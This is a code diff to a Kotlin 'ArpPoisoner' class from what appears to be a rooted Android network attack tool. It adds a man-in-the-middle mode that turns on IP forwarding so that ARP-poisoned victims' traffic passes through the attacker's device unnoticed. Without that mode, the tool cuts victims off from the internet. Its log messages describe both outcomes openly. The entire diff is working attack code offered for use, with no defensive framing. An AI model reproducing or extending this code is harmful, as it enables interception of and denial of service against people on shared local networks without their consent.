@@ -90,6 +90,7 @@ class ArpPoisoner(
         gatewayMac: String,
         intervalMs: Int,
         oneWay: Boolean,
+        mitm: Boolean,
         log: (String) -> Unit,
         onStopped: (String) -> Unit
     ) {
@@ -107,6 +108,17 @@ class ArpPoisoner(
                 log("[*] multi-thread ARP poison ready")
                 log("    iface=${iface.displayName} ip=${iface.ip} if=${iface.name}")
                 log("    gateway=$gatewayIp/$gatewayMac spoof=${iface.mac} targets=${targets.size} interval=${intervalMs}ms")
+
+                if (mitm) {
+                    val ferr = RootNet.enableForwarding(iface.name)
+                    if (ferr == null) {
+                        log("[+] MITM forwarding ON — victim keeps internet, traffic transits this device")
+                    } else {
+                        log("[!] forwarding setup failed: $ferr (victim will lose internet)")
+                    }
+                } else {
+                    log("[*] cutoff mode — victim loses internet (no forwarding)")
+                }
 
                 useRootDaemon = false
                 val canRaw = NativeArp.canOpenRaw(iface.name)
@@ -155,6 +167,13 @@ class ArpPoisoner(
                 } catch (_: Throwable) {
                 }
                 useRootDaemon = false
+                if (mitm) {
+                    try {
+                        RootNet.disableForwarding(iface.name)
+                        log("[+] MITM forwarding OFF (reverted)")
+                    } catch (_: Throwable) {
+                    }
+                }
                 log("[+] all targets restored / stopped")
                 onStopped("stopped")
             }
